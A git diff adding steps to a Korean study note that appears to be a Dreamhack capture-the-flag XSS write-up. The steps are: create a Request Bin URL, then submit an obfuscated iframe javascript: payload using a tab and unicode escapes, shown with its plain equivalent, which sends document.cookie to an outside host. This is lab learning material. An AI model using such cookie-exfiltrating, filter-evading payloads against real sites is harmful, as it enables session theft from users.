@@ -140,4 +140,13 @@ vuln 페이지에서 전달된 탬플릿 변수를 기록할 때 HTML 엔티티 
 <br/>
 
 #### 방법 2: 외부 웹 서버 이용
+1. 외부에서 접근 가능한 웹 서버를 준비함
+    - Dreamhack에서 제공하는 드림핵툴즈 서비스의 Request Bin 기능을 이용함
+        + Request Bin 항목에서 랜덤한 URL를 생성한 후 이를 이용하여 익스플로잇을 수행함
 
+2. flag 페이지에서 ```<iframe src='javascr	ipt:\u0064ocument.locati\u006f\u006e.href = "https://RANDOMHOST.request.dreamhack.games/?memo=" + \u0064ocument.cookie;'/>```를 입력하고 제출 버튼을 클릭함
+    - ```<iframe src='javascript:document.location.href="https://RANDOMHOST.request.dreamhack.games/?memo="+document.cookie;'/>```를 입력한 것과 동일함
+  <img width="978" alt="외부 웹 서버_2" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/cfaf4c6f-3fc7-4875-9845-5c4b48655486">
+
+3. "good" 알림창이 출력되면 웹 서버의 접속 기록을 확인하여 OueryString 부분에서 임의 이용자의 쿠키 정보(FLAG)를 획득함
+  <img width="1527" alt="외부 웹 서버_3" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/f51c75ef-41b0-4537-9971-fcb6a9e0ba29">
